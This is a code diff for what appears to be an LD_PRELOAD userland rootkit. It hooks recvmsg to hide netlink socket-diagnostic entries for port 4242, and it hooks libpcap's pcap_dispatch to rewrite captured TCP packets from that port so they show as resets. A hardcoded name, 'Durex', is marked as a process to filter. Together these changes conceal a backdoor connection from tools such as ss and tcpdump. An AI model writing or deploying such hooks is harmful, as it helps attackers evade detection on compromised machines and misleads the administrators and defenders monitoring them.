@@ -13,6 +13,8 @@
 #include <arpa/inet.h>
 #include <linux/inet_diag.h>
 #include <pcap/pcap.h>
+#include <netinet/ip.h>
+#include <linux/tcp.h>
 
 static const char	*process_to_filter = "Durex";
 
@@ -200,15 +202,16 @@ DECLARE_FGETS();
 		ssize_t		ret, ret2;											\
 																		\
 		ret = original_##recvmsg(sockfd, msg, flags);					\
-		printf("RECVMSG ret:%ld\n", ret);								\
 		if (ret > 0) {													\
 			ret2 = ret;													\
-			if (((struct sockaddr_nl *)msg->msg_name)->nl_family == AF_NETLINK) { \
+			printf("RECVMSG family:%d\n", ((struct sockaddr *)msg->msg_name)->sa_family); \
+			if (((struct sockaddr *)msg->msg_name)->sa_family == AF_NETLINK) { \
+				printf("NETLINK\n");\
 				struct nlmsghdr *h = (struct nlmsghdr*)(msg->msg_iov->iov_base); \
 				while (NLMSG_OK(h, ret2)) {								\
 					if (h->nlmsg_type == NLMSG_DONE)					\
 						break ;											\
-					if (h->nlmsg_type == RTM_NEWADDR || h->nlmsg_type == RTM_NEWROUTE) { \
+					if (h->nlmsg_type == RTM_NEWADDR) {					\
 						struct inet_diag_msg *r = NLMSG_DATA(h);		\
 						if (ntohs(r->id.idiag_sport) == 4242)			\
 							h->nlmsg_type = NLMSG_DONE;					\
@@ -222,6 +225,35 @@ DECLARE_FGETS();
 
 DECLARE_RECVMSG();
 
+static void (*original_callback)(u_char*, const struct pcap_pkthdr*, const u_char*) = NULL;
+
+static void		pcap_dumper(u_char *user, const struct pcap_pkthdr *h, const u_char *bytes)
+{
+	struct ip	*ip = (struct ip *)(bytes + 14);
+	int			ipsize = (((ip)->ip_hl) & 0x0f) * 4;
+
+	if (ipsize < 20)
+		return ;
+	if (ip->ip_p == IPPROTO_TCP) {
+		struct tcphdr	*tcp = (struct tcphdr *)(bytes + 14 + ipsize);
+		int				tcpsize = tcp->doff * 4;
+		/* int				port = ntohs(tcp->dest); */
+
+		if (tcpsize < 20)
+			return ;
+		printf("src:\e[31m%u\e[0m dest:\e[32m%u\e[0m seq:%u ack_seq:%u\n"
+			   "res1:%u doff:%u fin:%u syn:%u rst:%u psh:%u ack:%u urg:%u ece:%u cwr:%u\n",
+			   ntohs(tcp->source), ntohs(tcp->dest),
+			   ntohl(tcp->seq), ntohl(tcp->ack_seq),
+			   tcp->res1, tcp->doff, tcp->fin, tcp->syn, tcp->rst, tcp->psh, tcp->ack, tcp->urg, tcp->ece, tcp->cwr);
+		if (ntohs(tcp->source) == 4242) {
+			tcp->syn = 0;
+			tcp->rst = 1;
+		}
+		original_callback(user, h, bytes);
+	}
+}
+
 #define DECLARE_PCAP_DISPATCH()											\
 	static int (*original_##pcap_dispatch)(pcap_t *, int, pcap_handler, u_char *) = NULL; \
 	int pcap_dispatch(pcap_t *p, int cnt, pcap_handler callback, u_char *user) { \
@@ -233,15 +265,8 @@ DECLARE_RECVMSG();
 			}															\
 		}																\
 																		\
-		int		ret, ret2;												\
-																		\
-		ret = original_##pcap_dispatch(p, cnt, callback, user);			\
-		printf("PCAP_DISPATCH ret:%d\n", ret);							\
-		if (ret > 0) {													\
-			ret2 = ret;													\
-			printf("ret:%d\n", ret2);									\
-		}																\
-		return ret;														\
+		original_callback = callback;									\
+		return original_##pcap_dispatch(p, cnt, pcap_dumper, user);		\
 	}
 
 DECLARE_PCAP_DISPATCH();
